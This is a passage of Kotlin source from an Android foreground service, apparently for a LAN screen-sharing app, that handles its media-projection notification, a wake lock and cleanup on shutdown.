                      startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                  } else {
                      startForeground(1, notif)
                  }
              }

              private fun updateNotification(text: String) {
                  try {
                      val notif = buildNotification(text)
                      val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                      manager.notify(1, notif)
                  } catch (_: Throwable) {}
              }

              private fun acquireWakeLock() {
                  if (wakeLock == null) {
                      val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                      wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ScreenShareLAN::WakeLock")
                      wakeLock?.acquire(10L * 60 * 60 * 1000)
                  }
              }

              override fun onDestroy() {
                  stopAll()
                  unregisterLockReceiver()
                  try { pollingThread?.interrupt() } catch (_: Throwable) {}
                  try { autoThread?.interrupt() } catch (_: Throwable) {}
                  try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Throwable) {}
                  super.onDestroy()
              }

              override fun onBind(intent: Intent?): IBinder? = null
          }
